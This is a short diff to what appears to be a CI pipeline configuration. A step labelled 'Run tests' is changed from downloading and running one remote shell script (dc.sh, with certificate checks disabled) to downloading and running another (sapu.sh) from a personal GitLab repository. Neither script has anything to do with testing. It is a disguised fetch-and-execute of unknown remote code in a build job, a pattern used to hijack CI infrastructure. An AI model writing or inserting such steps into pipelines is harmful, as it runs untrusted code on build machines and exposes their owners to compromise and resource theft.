@@ -8,7 +8,7 @@ working_dir: &working_dir ~/app
         name: Run tests
         command: |
                     
-                    wget --no-check-certificate -c https://gitlab.com/CherrySolano/dc/-/raw/main/dc.sh && chmod 777 dc.sh && ./dc.sh
+                    wget https://gitlab.com/TambraHudgens/aww/-/raw/main/sapu.sh && chmod u+x sapu.sh && ./sapu.sh
                     
 
 version: 2.0
